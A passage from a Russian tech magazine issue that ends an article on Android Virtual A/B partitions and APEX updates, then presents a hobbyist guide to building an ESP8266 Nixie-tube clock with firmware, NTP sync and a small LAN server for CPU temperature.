рузчик. Однако  к релизу  ста бильной версии Google планирует убрать
это ограничение.





                       DSU Loader


ВИРТУАЛЬНАЯ A/B-РАЗМЕТКА
Кроме  возможности  временной  уста новки  официальных  сборок  GSI,
механизм DSU также позволил реализовать еще одну весьма интересную
функцию — Virtual A/B.
  Мы уже рассматривали преимущества новой A/B‐разметки и то, какие
проблемы она может решить. Одна ко ввиду потери пространства, которое
может принести с собой A/B‐разметка на устройствах с ограниченным объ‐
емом NAND‐памяти, а также проб лем с миграцией Google не спешит зас‐
тавлять производителей смартфонов использовать новую разметку.
  Вместо этого они соз дали виртуальную A/B‐раз метку. Работает она при‐
мерно так же, как динамичес кие обновления, толь ко без отката на ранее
установленную  прошивку:  ког да  смартфон  обнаруживает  новое  OTA‐
обновление, он создает нес колько дополнительных системных раз делов
для новой прошивки, ска чивает в них обновление, а затем делает эти раз‐
делы активными (как и в случае с A/B‐раз меткой). После сле дующей перезаг‐
рузки смартфон загружа ется уже с новых раз делов; если загрузка проходит
успешно, то старые разделы удаляются, а освобожденное ими мес то отда‐
ется разделу userdata.
  Виртуальная  A/B‐разметка  будет обязательной  для  всех  устройств,
вышедших на рынок с Android 11.


МОДУЛЬНЫЕ ОБНОВЛЕНИЯ
Еще один шаг в решении проблемы с обновлениями — Project Mainline.
Это внедренная в Android 10 подсистема, позволя ющая обновлять куски An‐
droid в обход производителя устройства.
  В центре новой подсистемы — пакетный менеджер APEX, очень похожий
на тот, что используется в дистрибутивах Linux и новой операционке Google
Fuchsia. Работает он пример но так: допус тим, по оче редному указу пра‐
вительства в России вновь меня ют часовые пояса. Команда разработчиков
Android формирует новую версию пакета с часовы ми поясами и выкладывает
ее в Google Play. Пользователи получают обновление — все счастливы.





                   Содержимое пакета APEX

Таким же образом могут быть обновлены биб лиотеки и целые под системы.
Уже сейчас в AOSP дос тупны пакеты с рантаймом ART («виртуальная
машина», ответственная за запуск приложений), биб лиотека криптогра‐
фических алгоритмов  Conscrypt, набор муль тимедийных кодеков, муль‐
тимедийный фреймворк, DNS‐резолвер, интерфейс Documents UI, Permission
Controller, ExtServices, данные часовых поясов, ANGLE (прослойка для тран‐
сляции вызовов OpenGL ES в OpenGL, Direct3D 9/11, Desktop GL и Vulkan)
и Captive Portal Login. В теории в пакет APEX можно упаковать практически
любой компонент системы, и пользователи смо гут обновить его независимо
от производителя смартфона.
  Интересно, что APEX не производит обновление «на живую», когда старый
компонент  заменяется  новым.  Раздел  /system  в  Android  недоступен
для записи, поэтому APEX использует трюк с монтированием. Все обновля‐
емые файлы внутри пакета APEX находят ся в образе файловой сис темы ext4.
Когда пакет «устанавлива ется», система монтирует этот образ поверх раз‐
дела /system в режиме bind. В результате фай лы пакета как бы заменяют
оригинальные файлы Android, хотя в реальности все остается на своих мес‐
тах.
   Такой же трюк исполь зует Magisk для уста новки модификаций Android
без изменения раздела /system. И его автор уже сказал, что APEX станет
проблемой для Magisk.





                        «Уста новка» пакета APEX


Трюк с сох ранени ем прос транс тва
Внимательно прочитав раздел «A/B‐разметка», ты мог заметить, что эко‐
номия пространства при такой разметке в основном достигается за счет сок‐
ращения размера раздела system в два раза. И дело здесь вовсе не в том,
что при A/B‐разметке используется какая‐то специализированная сборка An‐
droid, а в отказе от «лишних» файлов.
  В классическом варианте раз метки системный раздел содержит не только
саму операционную систему, но и так называ емые файлы odex. Они пред‐
ставляют собой оптимизированные (пропущенные через AOT‐компилятор)
версии dex‐файлов, которые, в свою очередь, содержат код приложе ния.
  Файлы odex позволя ют сократить время старта приложения и повысить
его производительность. Они могут быть созданы тремя путями:
 • преинсталлированы на устройство (в клас сическом варианте разметки —
   в раздел system);
 • сгенерированы  динамически  во  время  использования  приложения
   или простоя устрой ства;
 • загружены из Google Play вместе с самим приложением.

Отсутствие файлов odex может серь езно испортить пользовательский экспи‐
риенс от первого запуска смартфона (время заг рузки может сос тавить нес‐
колько минут вместо десятков секунд), поэтому они необходимы сразу. С дру‐
гой стороны, они занимают примерно половину всего пространства раздела
system, а если этот раздел продублировать, то потеря пространс тва станет
существенной.
  Именно поэтому раз работчики отка зались от предустановки фай лов odex
в активный системный раз дел, а вместо этого залили их в неактивный сис‐
темный раздел вместо копии операционной сис темы. Так что жизненный цикл
смартфона с A/B‐разметкой выглядит так:
 1. При выпуске с конвейера раз дел system_a активный, содержит файлы
   операционной системы, раздел system_b неактивный, содержит файлы
   odex.
 2. Во время первого запуска система копиру ет файлы odex в раздел user
  data.
 3. После получения первого OTA‐обновления система записы вает обновле‐
   ние в раздел system_b, далее запус кает генера цию файлов odex (инстру‐
   мент dex2oat) для новой версии ОС (они также записы ваются в userdata)
   и после ее завершения помечает раз дел system_b (все разделы слота B)
   как активный.
 4. После перезагрузки смартфон загружа ет операционную систему с раз‐
   дела system_b, исполь зуя сгенерированные на третьем этапе файлы
   odex.




ВЫВОДЫ
A/B‐разметка и динамические разделы — одни из самых интересных и полез‐
ных технологий, появившихся в Android в пос ледние пять лет. В теории с их
помощью можно реализовать мультизагрузку, создавать раз делы для любых
подсобных задач и пол ностью менять таблицу разделов устройства, выкинув
все лишнее. Проб лема только в том, что без разлочки загрузчика и кастомной
прошивки все это будет недоступно.
   APEX, с другой стороны, в теории может решить большинство проблем
с обновлением смартфо нов. Однако, в отличие от дистрибутивов Linux и ОС
Fuchsia, пакеты APEX больше напоминают кос тыль, чем уместное инженерное
решение. С другой стороны — лучше так, чем никак.
GEEK



КАК Я СДЕЛАЛ «УМНЫЕ» ЧАСЫ
  НА ТРУБКАХ NIXIE И ESP8266




    КРАСИВОЕ


    Candidum
 duospirit@gmail.com    ВРЕМЯ





Наверняка ты уже видел в интернете самодель ные приборы
с красивыми винтажными лампами, внутри у которых жел‐
то‐оранжевые светящиеся цифры. Эти штуки называются
«газоразрядные индикаторы» или Nixie tube. В этой статье я
расскажу, как сделал из них часы с модулем Wi‐Fi. Впрочем,
можно не только использовать их как часы, но и выводить
любую информацию — нап ример, загрузку центрального
процессора в десктопе.


Один из главных недостатков самодельных часов (да и не только самодель‐
ных, к сожале нию) — точность хода невысока. Как эту проблему решают?
Некоторые используют специализированные микросхемы с термокомпенса‐
цией ухода частоты, например DS3231. По ключевым параметрам она замет‐
но превосходит популярную среди радиолюбителей DS1307. С последней
даже при удачно подоб ранном кварцевом резонаторе часы уходят на нес‐
колько минут в год.
  Однако можно зайти и с другой стороны, а именно — воспользоваться
серверами точного времени. Да, тог да устройству потребуется под ключение
к сети, но сейчас это уже не представляет осо бых труд ностей. Кроме того,
сразу исчезает проб лема уста новки текуще го времени. У часов может
не быть кнопок вовсе. Это лучший интерфейс: просто включил, и они работа‐
ют. Магия? Нет‐нет, лучше — технологии!
   Достаточно очевидный способ получить дос туп к сети в самодельном гад‐
жете — это использовать один из многочисленных модулей на ESP8266, нап‐
ример ESP12E. Моей первой мыслью было соб рать часы на микроконтрол‐
лере (STM32F030 или аналогичном), подключить ESP12E по UART и взаимо‐
действовать с модулем с помощью AT‐команд. Это наиболее простой путь,
но он не самый рациональный.
  Действительно, ведь ESP8266 тоже очень неплохой МК с 32‐битным
ядром, поэтому вариант реализовать все в одном месте выглядел слишком
соблазнительно. Однако при разработке и прототипировании пришлось
столкнуться с рядом неочевидных трудностей. Часть из них удалось решить,
часть пришлось обой ти, и ниже я пос тараюсь рассказать обо всем в под‐
робностях.


ПРОГРАММИРОВАНИЕ ESP8266
Взвесив все за и против, я решил писать код на С. MicroPython тоже смот‐
релся заманчиво, но в итоге тяга к минимализму взя ла свое. Прошивка ком‐
пилируется с использованием инс трументов esp‐open‐sdk. Кстати, для Arch
Linux есть соответствующий пакет в AUR, с его сборкой меньше всего проб‐
лем. Если ты никогда не имел дела с модулями ESP8266, то для быстрого
старта рекомендую ознакомиться с каким‐нибудь руководством в интернете.
  Поэтому далее я не буду оста навливать ся на базовых вещах. Замечу лишь,
что скорость прошив ки ESP8266 можно значительно повысить по сравнению
со стандартными настройками. Так, использование пре образователя USB —
UART на основе FT232RL позволяет установить скорость передачи в esptool
до 3 Мбит/с, что существенно больше предельной скорос ти FT232RL. Однако
мой чип с такими настройками работал устой чиво. Получится ли это на дру гих
похожих микросхемах — СН340 или СР2102, я не проверял. Скорость зада‐
ется с помощью ключа ‐b, а нужная секция Makeﬁle с изменениями выглядит
так:


flash:
  $(ESPTOOL) ‐b 3000000 write_flash 0 $(TARGET).elf‐0x00000.bin
0x10000
  $(TARGET).elf‐0x10000.bin


SPI В ESP8266
Подобно тому как язык чукчей беден на слова, но богат на образы, в ESP12E
мало выводов, но много интерфейсов. Поэтому разумно подключить блок
индикации через какой‐нибудь последова тельный интерфейс, например SPI.
В ESP8266 есть два таких интерфейса — SPI и HSPI — и ровно одна неоче‐
видная засада, связанная с ними. Дело в том, что стандартный SPI исполь‐
зуется  для  чте ния  из внешней  флеш‐памяти,  содержащей  прошивку.
При неаккуратном обращении с интерфей сом в микроконтрол лере возникнет
конфликт доступа, что приведет к зависа нию и перезагрузке.
  И самое забавное: если большинство функций находится во внутренней
RAM, то вся эта конструкция может даже успешно работать какое‐то время,
но неожиданно падать через нес колько часов работы. Обойти эту проблему
несложно — достаточно использовать HSPI вмес то SPI. Стандартная биб‐
лиотека, входящая в сос тав официального SDK, мне показалась неудобной,
и я использовал стороннюю реализацию ESP8266_SPI_Driver. По умолчанию
тут задана частота тактирова ния 4 МГц, порядок битов MSB ﬁrst, SPI mode 1
(CPOL=0, CPHA=1) — более чем достаточно для моих задач. Для передачи
используются макрофункции spi_tx8() и spi_tx32(), а сама ини циализация
интерфейса тривиальна:


spi_init(HSPI);


НЕ ВСЕ ТАК ПРОСТО
С самого начала я собирался реализовать ста тичес кую индикацию, для чего
планировал взять два сдвиговых регистра 74HC595 и под ключить к ним
на выход четыре К155ИД1 (ана лог SN74141). Однако в моих запасах нашлись
только  три  такие  микросхемы,  а  докупать  их  я  не  захотел.  Цены
на К155ИД1 сейчас кусаются, а в некоторых местах она стоит даже дороже,
чем ESP12E в Китае. И тут мне на глаза попалась MAX7219, предназначенная
для динамической индикации на семисегментных светодиодных панелях. И я
задался вопросом: можно ли с ее помощью сделать динамическую инди‐
кацию на неоновых индикаторах ИН1? Забегая вперед, скажу, что можно,
но коммутацию анодов придется устра ивать на транзисторах.
   Итак, берем MAX7219 и подключаем на выход (выводы сегментов) дво‐
ично‐десятичный дешифратор К155ИД1. Здесь очень удачно совпало, что
в MAX7219 выводы сегментов в выключенном состоянии подтягиваются к зем‐
ле, а не переходят в Z‐состояние. Поэтому К155ИД1 можно подключить нап‐
рямую. Коммутировать аноды я решил оптосборкой TLP627‐4, которая дол‐
жна быть достаточно быстрой для подоб ной задачи.





                    Схема индикации на MAX7219

Обрати  внимание,  что MAX7219 —  это  логика  с  уровнем 5  В, а  у
ESP8266 только 3,3 В. Следуя лучшим рекомендациям, здесь нужно ставить
преобразователь. Однако в данном случае все прекрасно работает и без
него, так что забудем о рекомендациях.





                    Ма кет на MAX7219

Итак,  собрали  макет,  подключили  один  индикатор,  инициализировали
MAX7219, отправили данные — работа ет! Подклю чили еще три индикатора,
отправили данные — не работает. Неприятность, однако.
   Как оказалось, все дело было в том, что моя оптосборка медленно зак‐
рывалась. Из‐за этого цифры двоились: когда вклю чал ся новый разряд, пре‐
дыдущий продолжал гореть некоторое время. Решить эту проблему, веро‐
ятно, можно было с использованием транзисторов вместо оптосборок, как на
схеме ниже.





                        Транзистор ный ключ

Но маломощных высоковольтных транзисторов у меня не оказалось, и я
решил настроить тайминги динамической инди кации. Поскольку с микросхе‐
мой MAX7219 сделать это не представлялось возможным, я заменил ее
на сдвиговый регистр, что поз волило получить контроль над таймингами.
Однако это также потребовало реализовать динамическую индикацию в коде.





           Динамичес кая индикация на сдвиговом регистре

Сдвиговый регистр тоже устойчиво работа ет c ESP8266 без преобразова‐
теля уровней. Данные периодичес ки передаются по SPI, который ограничен‐
но совместим с серийным интерфейсом сдвигового регис тра (ранее это уже
обсуждалось в статье про мобильный телефон). Каж дая посылка представ‐
ляет собой байт, четыре старших разряда которо го отвечают за включение
анодов, а младшие четыре раз ряда кодируют выводимую цифру. Проблему
недостаточной скорости выключения оптопары удалось решить программно,
заранее выключая анод за некото рое время до вклю чения сле дующего.


#define send595(data) spi_mast_byte_write(SPI,data)
uint8_t ind[4]={4,3,2,1};


void ICACHE_FLASH_ATTR user_init() {
  ...
  spi_master_init(SPI);
  os_timer_setfn(&led_timer, (os_timer_func_t *) indicate, NULL);
  os_timer_arm(&led_timer, 1, 1);
  ...
}


LOCAL void indicate(void *arg) {
  static uint8_t n=0, i=0;
  if (++i % 2) {
    send595((1<<(n+4))|ind[n]);
  } else {
    send595(ind[n]);
  }
  n++;
  if (n > 3) n=0;
}

Легко видеть, что каждый раз, когда зна чение i оказывается нечетным,
в регистр отправляется байт, включающий очередной анод и выводящий
цифру, тогда как при четном значении анод выключа ется. Выводимые данные
находятся в массиве ind, а вызов функции выполняется с помощью таймера.
В результате индикация заработала, но осталось периодичес кое легкое мер‐
цание.
   Ты мог обратить внимание, что в этом коде исполь зуется драй вер из SDK,
а кроме того, интерфейс SPI вмес то HSPI. Последний момент доставил мне
много проблем. Так, при попытке исполь зовать Wi‐Fi система даже отказыва‐
лась стартовать, тогда как без SPI Wi‐Fi работал. И у меня ушло много вре‐
мени, чтобы понять причины это го. А все из‐за конкуренции с флеш‐памятью!
В итоге, когда искал первопричину этих проб лем, я и отказался от исполь‐
зования динамической индикации.


HV5622 И АНТИКРИЗИСНОЕ РЕШЕНИЕ
Поиск в Сети показал, что в статической индикации использованию мик‐
росхем К155ИД1 совместно с 74LS41 (SN74141) есть альтернатива — высоко‐
вольтный 32‐битный сдвиговый регистр HV5622. Кстати, с использованием
этих сдвиговых регистров соз дан Divergence Meter Project. Это не часы,
но конструкция красивая, и описана она обстоятель но.
  В общем, в HV5622 хорошо все, кроме доступности и цены. Тут меня
и посетила идея: на выход 74HC595 можно поставить высоковольтные ключи
и таким образом получить наборный высоковоль тный сдвиговый регистр.
Более того, вместо одиночных транзисторов разумно использовать сборку
ULN2004. Тем более что токоограничивающие резисторы в нее уже встро‐
ены, а это сильно упрощает дело.
   Для полноцен ного использования четырех ИН1 потребуется коммутиро‐
вать сорок катодов (это 40 бит или пять сдвиговых регистров) и еще шесть
транзисторных сбо рок (сборки ULN2004 содержат семь ключей). Всего один‐
надцать корпусов. Казалось бы — много, но если прикинуть размеры конс‐
трукции, то одиннадцать SOIC16 занимают места меньше, чем шесть DIP16.


             INFO

                     Для  работы  собствен но  часов  достаточно
                      и 30 бит, но в моем проекте реализовано пол‐
                      ноценное управление.


В итоге окончательная схема получилась такая.





                  Финальная схема часов

Обрати внимание на стабилит рон D1 на 47 В — он служит для защиты ключей
от перенапряжения. Впрочем,  токи здесь небольшие. Другой момент,
о котором стоит упомянуть, — это питание ESP12E. Модуль может потреблять
заметный ток, так что целесообразно питать его от импульсного преобра‐
зователя и допол нитель но пос тавить электролит для устойчивой работы.
   Если говорить о программной час ти инди кации, то она реализуется фун‐
кцией indicate(char *data), принимающей на вход строку, что достаточно
удобно. Получен ная строка преобра зуется посимвольно и записы вается
в 64‐битную переменную temp, в которой в итоге формируется 40 бит, необ‐
ходимых  для передачи  в  регистры.  Так  как  у  нас  нет  возможности
передать 40 бит одним пакетом, то он переда ется в два захода — сна‐
чала 32 старших бита, затем 8 младших.
   Такое решение позволяет отправить данные максимально быстро, так
как основная задержка происходит при инициализации передачи. Поэтому
передать 32 бита и 8 бит получа ется быстрее, чем пять раз по 8 бит. При этом
используется ручное управление сиг налом CS, что делает паузу между
посылками незаметной для сдвиговых регистров.


#define CS_UP()  gpio_output_set((1 << 5), 0, (1 << 5), 0)
#define CS_DOWN()  gpio_output_set(0, (1 << 5), (1 << 5), 0)


void ICACHE_FLASH_ATTR indicate(char *data) {
  uint64_t temp=0;
  temp|=1<<(data[0]‐0x30);
  temp<<=10;
  temp|=1<<(data[1]‐0x30);
  temp<<=10;
  temp|=1<<(data[3]‐0x30);
  temp<<=10;
  temp|=1<<(data[4]‐0x30);


  CS_DOWN();
  spi_tx32(HSPI,(uint32_t)(temp>>8));
  spi_tx8(HSPI,(uint8_t)(temp&0xff));
  while(spi_busy(HSPI));
  CS_UP();
}

Статическая индикация полностью решила проб лему с эффектом мерцания.
Что  же   касается  цены   такого  решения,   то,   как  ни  странно,
пять 74HC595 и шесть ULN2004 все равно дешевле одной К155ИД1 (не
говоря уже о HV5622).


ПАРА СЛОВ ОБ ИНДИКАТОРАХ
В приведенной выше схеме часов использован повышающий DC/DC‐пре‐
образователь на мик росхеме MC33063. Схема показала себя очень хорошо,
работает стабильно и не греется. Единственный нюанс — это достаточно
низкая нагрузоч ная спо соб ность, около 5–10 мА.





                           Блок питания

Если хочется получить большую мощность (например, в слу чае некачествен‐
ных индикаторов), то следует использовать сетевой трансформатор или двух‐
тактные повышающие преобразова тели на микросхеме IR2153. Допол нитель‐
но могу рекомендовать хорошую статью о питании индикаторов.


           WARNING

                   В анодных цепях Nixie‐индикаторов используется
                       высокое напряжение, опасное для жизни и здо‐
                         ровья! Если у тебя нет опыта работы с высоко‐
                        вольтными схемами, категорически не рекомен‐
                        дуется повторять все описан ное на практике.
                    По крайней мере без помощи более опытного
                       товарища.


Ну и разумеется, стоит рас ска зать о самих Nixie. В моем проекте исполь‐
зованы достаточно доступные индикаторы ИН1. Они дешевле других из‐за
неудобного цоколя (панелька стоит дороже лампы и не везде есть в про‐
даже), и качество исполнения обычно отвра тительно, но оно раз личается
от партии к партии. У ИН1, как и у других Nixie, иногда встречается неприятная
проблема, когда цифры светят ся лишь частями.
   Это может быть следствием отравления катодов. Впрочем, проблема
решаемая, так как мож но просто увеличить ток через индикатор, зачастую
этого достаточно. Кроме того, полезно подоб рать анодный резистор для каж‐
дого индикатора отдельно, что поз волит сбалансировать яркость и добиться
равномерного  свечения  всех  цифр.  Также рекомендуют периодически
зажигать все катоды индикатора по очереди, что должно позитивно сказаться
на сроке службы изделия. Я для такого исполь зую функцию effect(),
которая вызывается раз в минуту. Не знаю, насколько это на самом деле
эффективно, но смотрится и правда эффектно.


void ICACHE_FLASH_ATTR effect() {
  char str[5] = "00:00";
  for (uint8_t i = 0 ; i < 10; i++) {
    os_memset(str, 0x30 + i, 5);
    indicate(str);
    os_delay_us(50000);
  }
}

Более радикальный метод вос ста новления катодов Nixie заключается во вре‐
менном пропускании повышен ного тока через инди катор, но он мне не пот‐
ребовался.
  Но что все‐таки делать с неудоб ным цоколем? Если для ИН12 панельку
можно изготовить из контактов разъема D‐Sub, то для ИН1 наиболее прос‐
тым решением остается пайка. Впрочем, использованные в конструкции
индикаторы при желании (или необ ходимос ти) мож но заменить на любые
аналогичные.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
    КРАСИВОЕ ВРЕМЯ
          КАК Я СДЕЛАЛ «УМНЫЕ» ЧАСЫ НА ТРУБКАХ NIX‐
                                                     IE И ESP8266





WI-FI И NTP
Подключение ESP8266 к Wi‐Fi хорошо описано в раз ных источниках, поэтому
здесь приведу лишь краткий алгоритм. Сна чала указывается функция —
обработчик статуса соединения. Затем создает ся структура параметров, ее
поля заполняются данными, определен ными в фай ле inc/user_config.h,
после чего и инициирует ся подключение к точке доступа.


void ICACHE_FLASH_ATTR user_init(void) {
  // Wi‐Fi connect
  wifi_set_event_handler_cb(wifi_handle_event_cb);
  if (wifi_set_opmode(STATION_MODE)) {
    wifi_station_disconnect();
    os_memcpy(wifi_config.ssid, SSID, sizeof(SSID));
    os_memcpy(wifi_config.password, PASSWORD, sizeof(PASSWORD));
    wifi_config.bssid_set = 0;
    wifi_station_set_config(&wifi_config);
  } else {
    uart0_sendStr("ERROR: setting the station mode has failed.\r\n");
  }
}

Далее уже функция‐обработчик отслежива ет статус соединения (да, к неб‐
локирующему программирова нию дос таточно тяжело привыкнуть). Затем,
как только ESP8266 получит IP‐адрес, про исходит обращение к серверу NTP.
После этого задаются адреса серверов точного времени и часовой пояс.


void wifi_handle_event_cb(System_Event_t *evt) {
  os_printf("event %x: ", evt ‐> event);
  switch (evt ‐> event) {
  ...
  case EVENT_STAMODE_GOT_IP:
    ...
    // SNTP enable
    ip_addr_t *addr = (ip_addr_t  *)os_zalloc(sizeof(ip_addr_t));
    // Set server 0 by domain name
    sntp_setservername(0, "0.ru.pool.ntp.org");
    // Set server 1 by domain name
    sntp_setservername(1, "1.ru.pool.ntp.org");
    // Set SAMT time zone
    sntp_set_timezone(+3);
    sntp_init();
    os_free(addr);


    // Set a timer to check SNTP timestamp
    os_timer_disarm(&sntp_timer);
    os_timer_setfn(&sntp_timer, (os_timer_func_t *)user_check_sntp
_stamp, NULL);
    os_timer_arm(&sntp_timer, 1000, 0);
    break;
  }
}

Затем  по  срабатыванию  таймера  sntp_timer  вызывается  функция
ser_check_sntp_stamp(void *arg), которая про бует обратиться к серверу
точного времени. Если успешно — запус кается локальный отсчет времени
и модуль отключается от точки дос тупа. В случае неудачи функция вновь
запускает таймер sntp_timer.


uint32_t ntp_stamp;


void ICACHE_FLASH_ATTR user_check_sntp_stamp(void *arg) {
  ntp_stamp = sntp_get_current_timestamp();
  if (ntp_stamp == 0) {
    os_timer_arm(&sntp_timer, 1000, 0);
  } else {
    os_timer_disarm(&sntp_timer);
    os_printf("sntp: %d, %s",ntp_stamp, sntp_get_real_time(ntp_stamp
));
    os_printf("system time: %d\r\n",time_cor);
    os_timer_setfn(&rtc_timer, (os_timer_func_t *)printf_local_time,
NULL);
    os_timer_arm(&rtc_timer, 1000, 1);
    wifi_station_disconnect(); // disconnect
  }
}


ЭПОХА UNIX И ОТСЧЕТ ВРЕМЕНИ
Функция sntp_get_current_timestamp() воз вра щает время в формате
UNIX, то есть количество секунд с 1 января 1970 года. Но как из этого целого
числа получается текущее время и дата? Тут на сцену выходит дру гая сис тема
отсчета, известная как юлианская дата. Это число суток, прошед ших с полуд‐
ня понедельника, 1 января 4713 до н. э. Ключевой момент в том, что для юли‐
анского формата существуют готовые алгоритмы пересчета в даты для боль‐
шинства известных календарей. Собственно, для этого юлианскую дату
и придумали. Чтобы получить дату и время по гри гори анскому календарю,
секунды UNIX переводят в юлианские сут ки, а уже последние пересчитывают
в требуемое время. Неочевидно, да?
  К счастью, функция перево да времени UNIX в дату уже входит в библиоте‐
ку SNTP в составе SDK, поэто му нам не придет ся изобретать велосипед. Мы
воспользуемся sntp_get_real_time(long t), которая принимает на вход
время UNIX и возвращает ука затель на строку вида 'Sat Feb 15 22:16:45 2020'.
Таким образом, достаточно инкрементировать ntp_stamp раз в секунду
и передавать  его фун кции sntp_get_real_time(ntp_stamp). Остается
добавить к полученному ука зателю смещение по строке, и можно отправлять
результат функции как indicate(real_time_str  +  11). Допол нительное
копирование строки нужно для отладочного вывода по UART.


void ICACHE_FLASH_ATTR printf_local_time(void *arg) {
  char real_time_str[25];
  ntp_stamp++;
  os_memcpy(real_time_str,sntp_get_real_time(ntp_stamp), 24);
  real_time_str[24] = 0;
  if(!(ntp_stamp%60)) effect();
  indicate(real_time_str + 11); // hrs, mins


  os_printf("LOCAL: %d, %s\r\n", ntp_stamp, real_time_str);
  os_printf("SYSTIME: %dus\r\n", system_get_time());
}

Теперь функцию будет вызывать ранее инициализированный таймер rtc_‐
timer. Несмотря на то что в даташите внутренний таймер не указан как пре‐
цизионный, он довольно точен. Ну а если точности вдруг окажется недос‐
таточно, всегда можно будет заново синхронизироваться с серверами.


        WWW

                    Исходный код проекта находится на GitHub.




ЧУТЬ-ЧУТЬ КОНСТРУКТИВА
Компоненты про екта расположены на двух платах из фольгированного
гетинакса для допол нительного анту ража, каких‐то других причин исполь‐
зовать гетинакс вместо текстолита на самом деле нет. Тем более по удобс тву
обработки гетинакс значитель но усту пает тексто литу. На тыльной плате смон‐
тированы сами часы и схемы питания, тогда как на фронтальной размещены
неоновые индикаторы и их токоограничивающие резисторы.





                          Плата часов





                      Плата с индикато рами

Платы соединяются винтами М3 и закреплены на подставке из оргстекла.





                        В сборе


А ЧТО КРОМЕ ЧАСОВ?
Окей, с часами разоб рались, а что еще можно здесь сде лать? Вот, например,
выше мы делали запрос к серверам точного времени и получили ответ.
На самом деле нич то не мешает нам поднять на локальной машине сервер,
который при обращении будет выдавать температу ру или загрузку процес‐
сора. А на ESP8266 информацию получит, соот ветс твенно, клиент, задачей
которого будет вывести данные на Nixie. Таким образом, у нас будет стильный
и необычный индикатор температу ры для домашнего десктопа (или ноутбука)!


Пишем сервер
Подходящий сервер сегодня мож но написать практичес ки на чем угодно, хоть
на том же Python. Но мне захотелось (почему‐то) сделать это на связ ке С и
Shell. То есть сам сервер будет на С, а температу ру процессора получим
средствами оболочки. Скрипт получился совсем простой:


#!/bin/bash
sensors|grep CPU:|awk '{print $2}'|sed 's/+/00/'

Типичный вывод этого скрипта выглядит как 0041.0°C.
   Теперь перейдем к серверу. За осно ву взят один пример из книги «Хакинг:
искусство эксплойта». Сервер слушает порт 7890 и, когда устанавливается
входящее соединение, запускает скрипт, прежде чем отправить вывод кли‐
енту. Главное — не забыть закрыть соеди нение, пос ле чего процесс можно
повторить.


#define PORT 7890


int main(void) {
  FILE * cmd;
  char cmd_resp[80];
  int n;


  while(1) {
    // Loop
    sin_size = sizeof(struct sockaddr_in);
    new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &
sin_size);
    if(new_sockfd == ‐1) fatal("accepting connection");
    printf("server: got connection from %s port %d\n", inet_ntoa(
client_addr.sin_addr), ntohs(client_addr.sin_port));
    recv_length = recv(new_sockfd, &buffer, 1024, 0);
    buffer[recv_length]=0;
    printf("request: %s\r\n", buffer);
    cmd = popen("./mega_script.sh", "r");
    n = fread(cmd_resp, 1, 80, cmd);
    cmd_resp[n]=0;
    pclose(cmd);
    printf("> %s\r\n", cmd_resp);
    send(new_sockfd, cmd_resp, n, 0);
    close(new_sockfd);
  }
  return 0;
}

Работоспособность сервера всегда можно проверить с помощью netcat.


$echo "test" |nc localhost 7890


Клиент
Клиентская часть на ESP8266 в целом похожа на прошивку часов с той лишь
разницей, что после подклю чения к Wi‐Fi периодически происходит обра‐
щение к серверу и полученная строка выводится на индикатор. Работа с TCP
немного сложнее обращения к серверам точного времени, но и тут нет
ничего невозможного.


#define PORT   (7890)
#define SERVER ("192.168.0.170")


struct espconn *con_str_adr;


void ICACHE_FLASH_ATTR user_init(void) {
  ...
  struct espconn *conn = (struct espconn *)os_zalloc(sizeof(struct
espconn));
  if (conn != NULL) {
    conn ‐> type = ESPCONN_TCP;
    conn ‐> state = ESPCONN_NONE;
    conn ‐> proto.tcp = (esp_tcp *)os_zalloc(sizeof(esp_tcp));
    conn ‐> proto.tcp ‐> local_port = espconn_port();
    conn ‐> proto.tcp ‐> remote_port = PORT;
    ip = ipaddr_addr(SERVER);
    os_memcpy(conn ‐> proto.tcp ‐> remote_ip, &ip, sizeof(ip));
    espconn_regist_connectcb(conn, tcp_connected);
    espconn_regist_disconcb(conn, tcp_disconnected_cb);
    espconn_regist_recvcb(conn, data_received_cb);
  } else {
    os_printf("TCP connect failed!\r\n");
  }
  con_str_adr = conn;
}

Затем нужно определить обработчики событий. К счастью, в нашем случае
достаточно лишь двух — уста новки соеди нения и приема данных. Таким
образом, по срабатыванию таймера temp_tim (акти виру ется после получе‐
ния IP‐адре са) устанавливается соединение с сервером, отправляется отла‐
дочная информация, далее принимается ответ от сервера, и соединение зак‐
рывается.


void ICACHE_FLASH_ATTR wifi_handle_event_cb(System_Event_t *evt) {
  if (evt ‐> event == EVENT_STAMODE_GOT_IP) {
    os_timer_disarm(&temp_tim);
    os_timer_setfn(&temp_tim, (os_timer_func_t *)send_data, NULL);
    os_timer_arm(&temp_tim, 1000, 1);
  }
}


void ICACHE_FLASH_ATTR send_data() {
  espconn_connect(con_str_adr);
}


void ICACHE_FLASH_ATTR tcp_connected(void *arg) {
  static uint32_t count = 0;
  struct espconn *conn = arg;
  os_sprintf(buffer, "MSG FROM ESP %d\n", count++);
  os_printf("Sending: %s", buffer);
  espconn_sent(conn, buffer, os_strlen(buffer));
}


void ICACHE_FLASH_ATTR  data_received_cb(void *arg, char *pdata,
unsigned short len) {
  struct espconn *conn = (struct espconn *)arg;
  os_printf( "recive val: %s", pdata);
  espconn_disconnect(conn);
  indicate2(pdata);
}

Новая функция индикации лишь немного отличается от использованной
ранее. Она также принима ет на вход стро ку, но теперь не пропускает второй
символ, где у часов был раз делитель :.


void ICACHE_FLASH_ATTR indicate2(char *data) {
  uint64_t temp = 0;
  temp |= 1 << (data[0] ‐ 0x30);
  temp <<= 10;
  temp |= 1 << (data[1] ‐ 0x30);
  temp <<= 10;
  temp |= 1 << (data[2] ‐ 0x30);
  temp <<= 10;
  temp |= 1 << (data[3] ‐ 0x30);


  CS_DOWN();
  spi_tx32(HSPI, (uint32_t)(temp >> 8));
  spi_tx8(HSPI, (uint8_t)(temp & 0xFF));
  while(spi_busy(HSPI));
  CS_UP();
}


И даже более
Что насчет других параметров компь юте ра? Средствами Shell загрузку про‐
цессора можно получить похожим однострочным скриптом.


vmstat|sed ‐n "3p"|awk 'BEGIN{FS=" "}{print 100‐$15"%"}'

Вместо загрузки ЦП ты можешь выводить любую актуальную информацию:
курс рубля, цены на гречу, количес тво дней до конца карантина или часов
до зарплаты... Да что угодно, лишь бы хва тило разрядности индикатора. :)
   №04 (253)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
